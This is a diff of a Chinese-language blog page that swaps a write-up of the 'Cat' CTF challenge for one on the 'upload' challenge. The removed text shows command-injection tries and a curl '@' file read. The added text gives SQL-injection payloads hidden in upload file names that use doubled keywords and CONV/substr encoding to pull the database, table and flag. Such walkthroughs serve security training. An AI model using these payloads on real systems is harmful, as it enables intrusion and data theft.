@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <link rel="icon" href="">
-  <title>攻防世界web进阶区Cat详解 | wumingzhilian</title>
+  <title>攻防世界web进阶区upload详解 | wumingzhilian</title>
   <meta name="author" content="wuming" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -15,13 +15,13 @@
     
       <meta name="description" itemprop="description" content="" />
     
-    <meta property="og:title" content="攻防世界web进阶区Cat详解" />
+    <meta property="og:title" content="攻防世界web进阶区upload详解" />
     
-    <meta property="og:url" content="http://wumingzhilian.github.to/2020/08/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BACat%E8%AF%A6%E8%A7%A3/" />
+    <meta property="og:url" content="http://wumingzhilian.github.to/2020/08/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAupload%E8%AF%A6%E8%A7%A3/" />
     
       <meta name="twitter:card" content="summary" />
       <meta name="twitter:site" content="@wumingzhilian" />
-      <meta name="twitter:title" content="攻防世界web进阶区Cat详解" />
+      <meta name="twitter:title" content="攻防世界web进阶区upload详解" />
       
         <meta name="twitter:description" content="" />
       
@@ -108,11 +108,11 @@
     <article>
         <div class="kratos-hentry kratos-post-inner clearfix">
             <header class="kratos-entry-header">
-                <h1 class="kratos-entry-title text-center">攻防世界web进阶区Cat详解</h1>
+                <h1 class="kratos-entry-title text-center">攻防世界web进阶区upload详解</h1>
                 
                 <div class="kratos-post-meta text-center">
                     <span>
-                    <i class="fa fa-calendar"></i> 2020-08-07
+                    <i class="fa fa-calendar"></i> 2020-08-13
                     <i class="fa fa-folder"></i> 分类于 <a class="label-link" href="/categories/CTF/">CTF</a>
                     <i class="fa fa-user"></i> 作者 wuming
                     </span>
@@ -121,20 +121,34 @@
             <div class="kratos-post-content">
                 
                     <div class="kratos-post-inner-toc">
-                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">详解</span></a></li></ol></li></ol>
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1CONV%EF%BC%88N-from-base-to-base%EF%BC%89"><span class="toc-number">1.0.1.</span> <span class="toc-text">②CONV（N,from_base,to_base）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2substr%EF%BC%88string-start-length%EF%BC%89"><span class="toc-number">1.0.2.</span> <span class="toc-text">③substr（string,start,length）</span></a></li></ol></li></ol></li></ol>
                     </div>
                 
                 <hr />
-                <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://img-blog.csdnimg.cn/20200807120438869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但是我们输入一个链接的时候发现没有回显<br><img src="https://img-blog.csdnimg.cn/20200807120513749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是我们访问loli.club的页面<br><img src="https://img-blog.csdnimg.cn/2020080712054391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们输入ip地址，发现有回显</p>
-<h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><p>至此，我们猜测是一个代码执行的考点<br>我们尝试<br>127.0.0.1||ls<br>127.0.0.1&amp;&amp;ls<br>127.0.0.1|ls<br>均被过滤</p>
-<p><img src="https://img-blog.csdnimg.cn/20200807121131144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们发现他的url处存在编码，url编码我们进行尝试<br>发现，url编码为%80时报错，<br>因为ASCII码的编码范围0-127<br>%80相当于128 所以推断是由unicode解码失败导致的，</p>
-<p>在比赛的时候有个提示：</p>
-<blockquote>
-<p>RTFM of PHP CURL===&gt;&gt;read the fuck manul of PHP CURL???</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200807123227185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们可以看到，他是POST方式，同时有着Django的模板<br>根据大佬的教学</p>
-<p><img src="https://img-blog.csdnimg.cn/20200807123334381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>可以使用at为前缀并使用完整路径<br>我们根据django的目录，<br>可以从配置文件settings.py的报错中看看有没有database的相关信息<br><code>?url=@/opt/api/api/settings.py</code><br><img src="https://img-blog.csdnimg.cn/20200807123646568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们找到他是一个sqlite3数据库<br>我们看看他的内容<br><img src="https://img-blog.csdnimg.cn/20200807123947183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200807124231589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+                <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://img-blog.csdnimg.cn/20200813142443163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进入页面是我们的注册<br>登录以后，发现可以文件上传</p>
+<p><img src="https://img-blog.csdnimg.cn/20200813151657543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200813151725746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>传完之后发现有回显，猜测可能是文件名注入<br>我们先进行一系列得上传测试，发现都不行<br><img src="https://img-blog.csdnimg.cn/20200813151946558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>这时候，御剑发来了好消息，<br>这儿有一个include，classes的文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20200813152723441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>我们使用burp康康有哪些过滤<br><img src="https://img-blog.csdnimg.cn/20200813152744142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200813152843696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现被制为了空，我们猜一猜是双写绕过</p>
+<p>下面解除文件名字注入</p>
+<p>1.把文件名改成 <code>a&#39; +(selselectect conv(substr(hex(database()),1,12),16,10))+ &#39;.jpg </code><br>① 这里使用substr的原因是当数字过长的时候会变成科学计数法，所以需要分批次来获取内容<br>②使用CONV是因为题目过滤了回显有字母的情况，如果出现了字母则后面的内容就不显示，所以需要将16进制的内容转成10进制<br>或者我们可以使用两次hex绕过也可以</p>
+<p>这时候返回了我们的值<br><img src="https://img-blog.csdnimg.cn/2020081316114591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>我们先16进制转换为10进制，然后再转回去<br><img src="https://img-blog.csdnimg.cn/20200813161546798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>数据库叫web_up</p>
+<p>很明显有点少，我们把范围往后扩大一下<br><code>a&#39; +(selselectect conv(substr(hex(database()),12,15),16,10))+ &#39;.jpg </code><br><img src="https://img-blog.csdnimg.cn/20200813162119157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200813162126779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200813161958284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>2- 然后我们查询表名</p>
+<p><code>a&#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#39;web_upload&#39; limit 1,1)),1,12),16,10))+&#39;.jpg</code><br><code>a&#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#39;web_upload&#39; limit 1,1)),13,12),16,10))+&#39;.jpg</code><br><code>a&#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#39;web_upload&#39; limit 1,1)),25,12),16,10))+&#39;.jpg</code><br>十进制：<br>114784820031327<br>112615676665705<br> 126853610566245<br><img src="https://img-blog.csdnimg.cn/20200813163030566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>字符拼接完成<br>如下转自<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Sacrifice_li/article/details/106714709">https://blog.csdn.net/Sacrifice_li/article/details/106714709</a></p>
+<p>3.然后是列名：（i_am_flag）</p>
+<p>①s ‘+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’ limit 0,1)),1,12),16,10))+’.jpg————-&gt;结果为 i_am_f</p>
+<p>②s ‘+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’ limit 0,1)),13,12),16,10))+’.jpg———–&gt;结果为 lag</p>
+<p>4.字段内容：（!!<a href="mailto:&#x5f;&#x40;&#109;&#95;&#84;&#104;&#x2e;&#101;&#x5f;&#70;">&#x5f;&#x40;&#109;&#95;&#84;&#104;&#x2e;&#101;&#x5f;&#70;</a>!lag）</p>
+<p>①s ‘+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+’.jpg<br>——-&gt;结果为： !!<em>@m</em></p>
+<p>②s ‘+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+’.jpg<br>——-&gt;结果为： Th.e_F</p>
+<p>③s ‘+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+’.jpg<br>——-&gt;结果为： !lag</p>
+<h3 id="②CONV（N-from-base-to-base）"><a href="#②CONV（N-from-base-to-base）" class="headerlink" title="②CONV（N,from_base,to_base）"></a>②CONV（N,from_base,to_base）</h3><p>函数，是指将N以from_base为底的基数，转成to_base的数，例如CONV(5,10,2)，意思就是把10进制的5转成2进制</p>
+<h3 id="③substr（string-start-length）"><a href="#③substr（string-start-length）" class="headerlink" title="③substr（string,start,length）"></a>③substr（string,start,length）</h3><p>—&gt;string指的是字符串，start是从什么位置开始，length是长度，返回内容为截取的字符串</p>
+<p>在本题中，由于内容太长而导致会变成科学计数法，所以需要用截取，同时配合CONV来使用以至于不会被回显拦截。</p>
 
             </div>
             
@@ -190,7 +204,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "http://wumingzhilian.github.to/2020/08/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BACat%E8%AF%A6%E8%A7%A3/",
+                text: "http://wumingzhilian.github.to/2020/08/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAupload%E8%AF%A6%E8%A7%A3/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -202,10 +216,13 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "http://wumingzhilian.github.to/2020/08/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BACat%E8%AF%A6%E8%A7%A3/";
-            const title         = "「攻防世界web进阶区Cat详解」";
-            const excerpt       = `题目但是我们输入一个链接的时候发现没有回显这是我们访问loli.club的页面我们输入ip地址，发现有回显
-详解至此，我们猜测是一个代码执行的考点我们尝试127.0.0.1||ls127.0.0.1&amp;&amp;ls127.0....`;
+            const hostUrl       = "http://wumingzhilian.github.to/2020/08/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAupload%E8%AF%A6%E8%A7%A3/";
+            const title         = "「攻防世界web进阶区upload详解」";
+            const excerpt       = `题目进入页面是我们的注册登录以后，发现可以文件上传
+传完之后发现有回显，猜测可能是文件名注入我们先进行一系列得上传测试，发现都不行
+这时候，御剑发来了好消息，这儿有一个include，classes的文件
+
+我们使用burp康康有哪些...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -227,7 +244,7 @@
                         <a class="tag-none-link" href="/tags/web%E8%BF%9B%E9%98%B6%E5%8C%BA/" rel="tag">web进阶区</a>, <a class="tag-none-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a>
                     </div>
                     <div class="pull-date">
-                    <span>最后编辑：2020-08-07</span>
+                    <span>最后编辑：2020-08-13</span>
                     </div>
                 </div>
             </footer>
@@ -236,13 +253,9 @@
             <nav class="navigation post-navigation clearfix" role="navigation">
                 
                 <div class="nav-previous clearfix">
-                    <a title=" 攻防世界web进阶区ics-04详解" href="/2020/08/07/ics-05/">&lt; 上一篇</a>
+                    <a title=" 攻防世界web进阶区Zhuanxv详解" href="/2020/08/13/攻防世界web进阶区Zhuanxv详解/">&lt; 上一篇</a>
                 </div>
                 
-                
-                <div class="nav-next clearfix">
-                    <a title=" 攻防世界web进阶区bug详解" href="/2020/08/07/攻防世界web进阶区bug详解/">下一篇 &gt;</a>
-                </div>
                 
             </nav>
         
@@ -254,8 +267,8 @@
         new DisqusJS({
             shortname: '',
             siteName: '',
-            identifier: '2020/08/07/攻防世界web进阶区Cat详解/',
-            url: 'http://wumingzhilian.github.to/2020/08/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BACat%E8%AF%A6%E8%A7%A3/',
+            identifier: '2020/08/13/攻防世界web进阶区upload详解/',
+            url: 'http://wumingzhilian.github.to/2020/08/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAupload%E8%AF%A6%E8%A7%A3/',
             api: '',
             apikey: '',
             admin: '',
@@ -281,7 +294,7 @@
     </div>
     <div class="textwidget">
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">详解</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1CONV%EF%BC%88N-from-base-to-base%EF%BC%89"><span class="toc-number">1.0.1.</span> <span class="toc-text">②CONV（N,from_base,to_base）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2substr%EF%BC%88string-start-length%EF%BC%89"><span class="toc-number">1.0.2.</span> <span class="toc-text">③substr（string,start,length）</span></a></li></ol></li></ol></li></ol>
         
     </div>
 </aside>
